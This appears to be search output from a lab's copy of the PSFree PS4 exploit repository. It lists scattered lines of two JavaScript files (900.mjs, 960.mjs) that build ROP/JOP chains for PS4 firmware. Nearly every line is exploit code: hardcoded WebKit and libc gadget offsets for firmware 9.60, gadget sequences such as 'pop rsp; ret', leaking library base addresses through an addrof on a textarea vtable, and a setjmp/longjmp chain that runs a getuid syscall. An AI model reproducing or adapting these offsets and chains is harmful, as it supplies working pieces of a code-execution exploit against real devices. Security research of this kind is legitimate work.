+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:548:    init_syscall_array(syscall_array, libkernel_base, 300 * KB);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:549:    debug_log('syscall_array:');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:550:    debug_log(syscall_array);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:551:    Chain.init_class(gadgets, syscall_array);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:554:function test_rop(Chain) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:560:    setjmp_addr = gadgets.get('setjmp');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:561:    longjmp_addr = gadgets.get('longjmp');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:566:    chain.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:594:    chain.push_gadget('pop rsi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:597:    chain.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:603:    chain.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:605:    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:611:    chain.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:613:    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:626:    chain.push_gadget('pop rsi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:629:    chain.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:635:    chain.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:637:    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:643:    chain.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:645:    chain.push_gadget('mov qword ptr [rsi], rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:654:    debug_log('test syscall getuid()');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:656:    // Set the return value to some random value. If the syscall worked, then
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:661:    chain.syscall('getuid');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:665:        die('syscall getuid failed');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/900.mjs:670:test_rop(Chain);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:30:    find_base,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:32:    resolve_import,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:33:    init_syscall_array,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:37:import * as o from './module/offset.mjs';
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:43:const syscall_array = [];
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:45:const offset_func_exec = 0x18;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:46:const offset_textarea_impl = 0x18;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:47:const offset_js_inline_prop = 0x10;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:49:// WebKit offsets of imported functions
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:50:const offset_wk_stack_chk_fail = 0x178;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:51:const offset_wk_memcpy = 0x188;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:53:// libSceLibcInternal offsets
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:54:const offset_libc_setjmp = 0x21284;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:55:const offset_libc_longjmp = 0x254DC;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:70:let libwebkit_base = null;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:71:// libkernel_web.sprx
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:72:let libkernel_base = null;
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:76:// Chain implementation based on Chain803. Replaced offsets that changed
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:77:// between versions. Replaced gadgets that were missing with new ones that
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:80:// gadgets for the JOP chain
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:82:// Why these JOP chain gadgets are not named jop1-3 and jop2-5 not jop4-7 is
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:83:// because jop1-5 was the original chain used by the old implementation of
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:84:// Chain803. Now the sequence is ta_jop1-3 then to jop2-5.
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:86:// When the scrollLeft getter native function is called on PS4 9.60, rsi is the
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:88:const ta_jop1 = `
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:96:// ta_jop1 pushed another object (via the call instruction) but we want no
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:98:// jop2 later. So we pop the return address pushed by ta_jop1.
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:101:const ta_jop2 = `
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:106:const ta_jop3 = `
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:113:const jop2 = `
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:119:const jop3 = `
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:124:const jop4 = `
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:128:const jop5 = 'pop rsp; ret';
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:142:const rop_epilogue = 'leave; ret';
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:144:const webkit_gadget_offsets = new Map(Object.entries({
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:181:    [jop2] : 0x00000000001a75a0,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:182:    [jop3] : 0x000000000035fc94,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:183:    [jop4] : 0x00000000002b7a9c,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:184:    [jop5] : 0x00000000000253e0,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:186:    [ta_jop1] : 0x000000000060fd94,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:187:    [ta_jop2] : 0x0000000002bf3741,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:188:    [ta_jop3] : 0x000000000181e974,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:191:const libc_gadget_offsets = new Map(Object.entries({
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:194:    'setjmp' : offset_libc_setjmp,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:195:    'longjmp' : offset_libc_longjmp,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:198:const gadgets = new Map();
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:202:    const webcore_textarea = mem.addrof(textarea).readp(offset_textarea_impl);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:204:    const libwebkit_base = find_base(textarea_vtable, true, true);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:207:        libwebkit_base
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:208:        .add(offset_wk_stack_chk_fail)
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:210:    const stack_chk_fail_addr = resolve_import(
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:215:    const libkernel_base = find_base(stack_chk_fail_addr, true, true);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:217:    const memcpy_import = libwebkit_base.add(offset_wk_memcpy);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:218:    const memcpy_addr = resolve_import(memcpy_import, true, true);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:219:    const libc_base = find_base(memcpy_addr, true, true);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:222:        libwebkit_base,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:223:        libkernel_base,
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:228:function init_gadget_map(gadget_map, offset_map, base_addr) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:229:    for (const [insn, offset] of offset_map) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:230:        gadget_map.set(insn, base_addr.add(offset));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:234:class Chain960Base extends ChainBase {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:243:        rw.write64(this.jmp_target, 0x7c, this.get_gadget(jop4));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:244:        rw.write64(this.jmp_target, 0, this.get_gadget(jop5));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:255:        this.push_gadget(rop_epilogue);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:291:    //     chain.push_gadget('mov rax, 0; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:293:    //     chain.push_gadget('pop rbx; ret'); // always executed
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:304:        this.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:306:        this.push_gadget('neg rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:307:        this.push_gadget('pop rsi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:309:        this.push_gadget('adc esi, esi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:310:        this.push_gadget('pop rdi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:312:        this.push_gadget('mov qword ptr [rdi], rsi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:320:        this.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:322:        this.push_gadget('mov rax, qword ptr [rax]; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:325:        this.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:329:        this.push_gadget('neg rax; and rax, rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:330:        this.push_gadget('pop rdi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:332:        this.push_gadget('mov qword ptr [rdi], rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:342:        this.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:346:        this.push_gadget('pop rsi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:353:        this.push_gadget('add rcx, rsi; and rdx, rcx; or rax, rdx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:354:        this.push_gadget('mov rdx, rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:359:        this.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:361:        this.push_gadget('mov rax, qword ptr [rax]; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:367:        this.push_gadget('add rax, rdx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:372:        this.push_gadget('pop rdi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:374:        this.push_gadget('mov qword ptr [rdi], rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:379:        this.push_gadget('pop rcx; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:381:        this.push_gadget('mov rdx, rax; xor eax, eax; shl rdx, cl; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:386:        this.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:388:        this.push_gadget('pop rsi ; cmc ; jmp qword ptr [rax + 0x7c]');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:410:        this.push_call(this.get_gadget('setjmp'), this.jmp_buf_p);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:421:        this.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:425:        this.push_gadget('pop rdi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:427:        this.push_gadget('mov qword ptr [rdi], rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:430:        this.push_gadget('pop rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:431:        this.push_value(this.get_gadget('ret'));
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:432:        this.push_gadget('pop rdi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:434:        this.push_gadget('mov qword ptr [rdi], rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:436:        this.push_call(this.get_gadget('longjmp'), this.jmp_buf_p);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:449:        this.push_gadget('pop rdi; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:451:        this.push_gadget('mov qword ptr [rdi], rax; ret');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:465:    syscall(...args) {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:467:            throw Error('syscall() needs an empty chain');
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:469:        this.push_syscall(...args);
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:477:// Chain for PS4 9.60
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:478:class Chain960 extends Chain960Base {
+/home/ubuntu/ps4-lab-1352/analysis/psfree_reference_9_04/repo/rop/960.mjs:487:        // Only offset 0x1c8 will be used when calling the scrollLeft getter
